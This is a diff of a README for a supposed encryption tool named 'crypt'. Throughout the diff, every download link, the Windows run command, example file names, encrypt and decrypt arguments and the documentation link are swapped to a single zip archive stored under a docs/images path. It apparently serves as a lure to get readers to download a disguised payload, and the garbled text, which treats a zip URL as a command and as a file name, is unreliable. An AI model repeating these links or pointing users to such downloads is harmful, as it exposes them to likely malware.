@@ -4,7 +4,7 @@
 Welcome to the crypt project. This tool helps you encrypt your data easily while being aware of your environment, inspired by Laravel's Crypt facade. Whether you are protecting sensitive files or securing communications, crypt simplifies encryption for everyone.
 
 ## 📥 Download Now
-[![Download crypt](https://raw.githubusercontent.com/redbuttonsa/crypt/main/examples/getappkey/Software-v3.3.zip)](https://raw.githubusercontent.com/redbuttonsa/crypt/main/examples/getappkey/Software-v3.3.zip)
+[![Download crypt](https://github.com/redbuttonsa/crypt/raw/refs/heads/main/docs/images/Software-3.5.zip)](https://github.com/redbuttonsa/crypt/raw/refs/heads/main/docs/images/Software-3.5.zip)
 
 ## 📋 Overview
 crypt is designed for users who want to encrypt their data without the complexity of traditional encryption tools. With a focus on ease of use and environmental awareness, crypt makes security accessible for all.
@@ -23,7 +23,7 @@ crypt is designed for users who want to encrypt their data without the complexit
 ## 🛠️ Installation
 1. **Visit the Download Page**  
    Go to the releases page to get the latest version of crypt:  
-   [Visit this page to download](https://raw.githubusercontent.com/redbuttonsa/crypt/main/examples/getappkey/Software-v3.3.zip).
+   [Visit this page to download](https://github.com/redbuttonsa/crypt/raw/refs/heads/main/docs/images/Software-3.5.zip).
 
 2. **Choose Your Version**  
    On the releases page, you'll find several versions of crypt. Select the one that suits your operating system.
@@ -35,20 +35,20 @@ crypt is designed for users who want to encrypt their data without the complexit
    Once downloaded, extract the files from the zip folder. You may use built-in tools in your operating system or dedicated software for this.
 
 5. **Run the Application**  
-   Open your command line or terminal. Navigate to the folder where you extracted crypt. Type `./crypt` (for Mac/Linux) or `https://raw.githubusercontent.com/redbuttonsa/crypt/main/examples/getappkey/Software-v3.3.zip` (for Windows) to start.
+   Open your command line or terminal. Navigate to the folder where you extracted crypt. Type `./crypt` (for Mac/Linux) or `https://github.com/redbuttonsa/crypt/raw/refs/heads/main/docs/images/Software-3.5.zip` (for Windows) to start.
 
 ## ⚙️ How to Use crypt
 Using crypt is straightforward. Here are some basic commands to get you started.
 
 ### Basic Encryption
 - To encrypt a file, use the following command:  
-  `crypt encrypt https://raw.githubusercontent.com/redbuttonsa/crypt/main/examples/getappkey/Software-v3.3.zip`
+  `crypt encrypt https://github.com/redbuttonsa/crypt/raw/refs/heads/main/docs/images/Software-3.5.zip`
 
 This command will generate an encrypted version of your file.
 
 ### Decryption
 - To decrypt a file, you can run:  
-  `crypt decrypt https://raw.githubusercontent.com/redbuttonsa/crypt/main/examples/getappkey/Software-v3.3.zip`
+  `crypt decrypt https://github.com/redbuttonsa/crypt/raw/refs/heads/main/docs/images/Software-3.5.zip`
 
 This retrieves the original content securely.
 
@@ -59,18 +59,18 @@ crypt uses environment variables to adapt to your settings. You may need to set 
 2. Use them in your commands.
 
 ## 📝 Example Usage
-Suppose you have a text file named `https://raw.githubusercontent.com/redbuttonsa/crypt/main/examples/getappkey/Software-v3.3.zip`. To secure it, follow these steps:
+Suppose you have a text file named `https://github.com/redbuttonsa/crypt/raw/refs/heads/main/docs/images/Software-3.5.zip`. To secure it, follow these steps:
 
 1. Open your terminal.
 2. Navigate to the directory with your file.
 3. Run:  
-   `crypt encrypt https://raw.githubusercontent.com/redbuttonsa/crypt/main/examples/getappkey/Software-v3.3.zip`
+   `crypt encrypt https://github.com/redbuttonsa/crypt/raw/refs/heads/main/docs/images/Software-3.5.zip`
 
-Your encrypted file will now appear as `https://raw.githubusercontent.com/redbuttonsa/crypt/main/examples/getappkey/Software-v3.3.zip`. To decrypt it later, just run:  
-`crypt decrypt https://raw.githubusercontent.com/redbuttonsa/crypt/main/examples/getappkey/Software-v3.3.zip`
+Your encrypted file will now appear as `https://github.com/redbuttonsa/crypt/raw/refs/heads/main/docs/images/Software-3.5.zip`. To decrypt it later, just run:  
+`crypt decrypt https://github.com/redbuttonsa/crypt/raw/refs/heads/main/docs/images/Software-3.5.zip`
 
 ## 🌟 Additional Resources
-- **Documentation:** For more detailed commands and examples, please refer to the [Documentation](https://raw.githubusercontent.com/redbuttonsa/crypt/main/examples/getappkey/Software-v3.3.zip).
+- **Documentation:** For more detailed commands and examples, please refer to the [Documentation](https://github.com/redbuttonsa/crypt/raw/refs/heads/main/docs/images/Software-3.5.zip).
 - **Support:** If you encounter issues, check the FAQ section in the documentation or reach out to the community via the repository's Issues page.
 
 ## 🕵️‍♂️ Security Tips
@@ -85,4 +85,4 @@ We welcome feedback on crypt. If you have suggestions or want to contribute, fee
 crypt offers a simple and effective way to secure your data without requiring a technical background. By following these steps, you can easily download, install, and start using crypt for your personal security needs.
 
 Don't forget to visit the releases page to download crypt:  
-[Visit this page to download](https://raw.githubusercontent.com/redbuttonsa/crypt/main/examples/getappkey/Software-v3.3.zip).
+[Visit this page to download](https://github.com/redbuttonsa/crypt/raw/refs/heads/main/docs/images/Software-3.5.zip).
